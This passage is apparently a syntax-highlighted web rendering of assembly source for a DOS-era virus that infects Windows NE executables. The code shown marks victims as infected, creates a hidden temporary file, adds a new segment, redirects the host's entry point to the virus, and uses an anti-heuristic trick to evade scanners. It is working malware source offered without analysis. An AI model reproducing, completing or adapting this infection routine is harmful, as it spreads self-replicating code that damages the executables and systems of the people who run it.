    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">0FFFEh</span><span class="sc0">  </span><span class="sc1">; mark as infected</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">; new exe file?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">new_exe</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">                      </span><span class="sc1">; if not, then close</span><span class="sc0">
</span><span class="sc5">new_exe</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">                  </span><span class="sc1">; create temporary file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; with hidden attributes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_filename</span><span class="sc0">  </span><span class="sc1">; DS:DX=address of filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">createfile_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">createfile_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.dest_handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; save temp file handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write DOS header of temp file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=file handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                   </span><span class="sc1">; CX=length to write</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; DS:DX=address write buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">write_dos_header_to_tmp_file_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">write_dos_header_to_tmp_file_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ECX=new exe header offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.offs_other_tbls</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.new_header_offs</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                  </span><span class="sc1">; size of dos header already written</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_file_block</span><span class="sc0">         </span><span class="sc1">; copy rest of DOS stub</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">copy_stub_ok</span><span class="sc0">            </span><span class="sc1">; no error-&gt;go on</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">

</span><span class="sc5">copy_stub_ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.source_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX=handle of victim file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read NE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                   </span><span class="sc1">; size of NE header</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; DX=offset of buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS=segment of buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_NE_header_OK</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">read_NE_header_OK</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX=new exe marker</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; anti-heuristic</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"EN"</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; NE exe file?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NE_file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">          </span><span class="sc1">; if not, then abort infection</span><span class="sc0">
</span><span class="sc5">NE_file</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">32h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CL=alignment shift</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; EAX=1</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; EAX=alignment unit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.alignment_unit</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">32h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CL=alignment shift</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">bp.file_size</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EAX=filesize</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; EAX=filesize in alignment units</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; save it as offset for the new</span><span class="sc0">
                    </span><span class="sc1">; segment that is going to be created</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">bp.alignment_unit</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX=alignment unit</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; set all bits below alignemt</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">bp.file_size</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; filesize already aligned?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">filesize_already_aligned</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; if not, round it up</span><span class="sc0">
</span><span class="sc5">filesize_already_aligned</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">segm_phys_size</span><span class="sc0">       </span><span class="sc1">; copy physical size of segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">segm_attribs</span><span class="sc0">         </span><span class="sc1">; copy segment attributes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">segm_virt_size</span><span class="sc0">       </span><span class="sc1">; copy virutal size of segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.new_sect_descr</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">;is the segment table directly</span><span class="sc0">
                    </span><span class="sc1">; after the NE header (standart case)?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">segment_table_ok</span><span class="sc0">        </span><span class="sc1">; if not, better not infect the file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">segment_table_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read the offset of the first segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; read a word</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.first_segm_offs</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DX=offset read buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS=segment read buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_first_segm_offs_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">read_first_segm_offs_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                </span><span class="sc1">; move file pointer relative to</span><span class="sc0">
                    </span><span class="sc1">; current position</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">               </span><span class="sc1">; CX:DX=-2 (new filepointer position)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; set the filepointer back to the</span><span class="sc0">
                    </span><span class="sc1">; start of the segment table</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">move_filepointer_back_to_segm_table_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">move_filepointer_back_to_segm_table_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EAX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.first_segm_offs</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=aligned file offset</span><span class="sc0">
                          </span><span class="sc1">; of first segment</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.alignment_unit</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EAX=file offset of the</span><span class="sc0">
                          </span><span class="sc1">; first segment in bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.first_segm_offs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">; EBX=beginning of the nonresident-name table (relative to filestart).</span><span class="sc0">
    </span><span class="sc1">; This is the last table in the NE header.</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; ECX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ECX=size of nonresident name</span><span class="sc0">
                        </span><span class="sc1">; table in bytes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; EBX=size of NE header + all tables</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; EAX=free room between the end of</span><span class="sc0">
                    </span><span class="sc1">; the NE header and the first segment</span><span class="sc0">
</span><span class="sc1">;*      cmp     eax,8                   ; is there enough room left to add</span><span class="sc0">
                    </span><span class="sc1">; another segment descriptor ?</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; fixup - byte match</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">segment_descriptor_adding_possible</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">segment_descriptor_adding_possible</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; entrypoint segment index</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.host_entry_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; entrypoint IP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.host_entry_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; segment count</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; add another segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; save new segment count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; new entry segment index</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_entry</span><span class="sc0">  </span><span class="sc1">; set new</span><span class="sc0">
                                </span><span class="sc1">; entry IP</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">37h</span><span class="sc4">],</span><span class="sc2">011110111b</span><span class="sc0">  </span><span class="sc1">; windows flags:</span><span class="sc0">
                            </span><span class="sc1">; kill gangload area</span><span class="sc0">

</span><span class="sc1">; fixup the offsets of the other NE header tables (all are after the segment</span><span class="sc0">
</span><span class="sc1">; table and therefore shifted back)</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">4h</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; entry table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; resource table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; resident-name table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; module-reference table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; imported-name table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">; nonresident-name table</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write modified NE header to tmp file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=temp file handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                   </span><span class="sc1">; NE header size</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; DX=write buffer offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS=write buffer segment</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">write_NE_header_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_tmp_file</span><span class="sc0">
</span><span class="sc5">write_NE_header_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EAX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=number of segments</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX=old number of segments</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; ECX=8 (size of a segment descriptor)</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; EAX=old size of segm descriptor tbl</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.offs_other_tbls</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc1">; until now, offs_other_tbls</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.offs_other_tbls</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; contained the offset of the new</span><span class="sc0">
                      </span><span class="sc1">; exe header, now we set it to the</span><span class="sc0">
                      </span><span class="sc1">; end of the new segment table.</span><span class="sc0">

